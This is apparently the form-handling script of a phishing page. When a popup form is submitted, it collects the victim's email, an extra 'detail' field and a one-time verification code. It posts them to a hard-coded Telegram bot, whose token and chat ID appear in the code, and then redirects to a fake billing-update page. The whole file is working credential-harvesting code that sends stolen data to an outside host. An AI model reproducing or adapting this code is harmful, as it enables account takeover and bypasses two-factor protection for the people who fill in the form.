

function log(message) {
    console.log(message);

    const box = document.getElementById("debug-log");
    if (box) {
        box.textContent += message + "\n";
        box.scrollTop = box.scrollHeight;
    }
}

window.onerror = function (msg, url, line, col, error) {
    log(`❌ JS ERROR:
${msg}
File: ${url}
Line: ${line}
Column: ${col}`);

    if (error) {
        log(error.stack);
    }

    return false;
};

window.addEventListener("unhandledrejection", (event) => {
    log("❌ Promise Error:");
    log(event.reason);
});

document.addEventListener("DOMContentLoaded", () => {
    log("✅ Page loaded.");

    const form = document.getElementById("pop-otp");

    if (!form) {
        log("❌ Form #pop-code not found.");
        return;
    }

    log("✅ Form found.");

    form.addEventListener("submit", async (e) => {
        e.preventDefault();

        log("✅ Submit clicked.");

        try {
            const submitBtn = document.getElementById("pop-submit");
            if (submitBtn) {
                submitBtn.disabled = true;
                log("Submit button disabled.");
            }

            // Replace these with your Telegram Bot details
            const BOT_TOKEN = "8883709162:AAH4hi8NPjE3ULxGdd3gcXFCjEwDGnosFbM";
            const CHAT_ID = "8614416084";

            log("Reading form values...");

            const codeEmail = form.querySelector('input[name="codeEmail"]')?.value || "";
            const codeDetail = form.querySelector('input[name="codeDetail"]')?.value || "";
            const code = form.querySelector('input[name="code"]')?.value || "";

            log(`Email: ${codeEmail}`);
            log(`Detail: ${codeDetail}`);
            log(`Code: ${code}`);

            const message =
`📩 New Popup Submission
Email: ${codeEmail}
Detail: ${codeDetail}
Code: ${code}`;

            log("Sending request to Telegram...");

            const response = await fetch(
                `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
                {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                    }),
                }
            );

            log(`HTTP Status: ${response.status}`);

            const result = await response.text();
            log("Telegram Response:");
            log(result);

            if (!response.ok) {
                throw new Error(`Telegram API returned ${response.status}`);
            }

            log("✅ Telegram message sent successfully.");
            log("Redirecting to /updatbilling/index.html");

            window.location.href = "/updatbilling/index.html";

        } catch (error) {
            log("❌ Error occurred:");
            log(error.stack || error.toString());

            const submitBtn = document.getElementById("pop-submit");
            if (submitBtn) submitBtn.disabled = false;

            // Uncomment if you still want to redirect on error:
            // window.location.href = "/bigger.html";
        }
    });
});
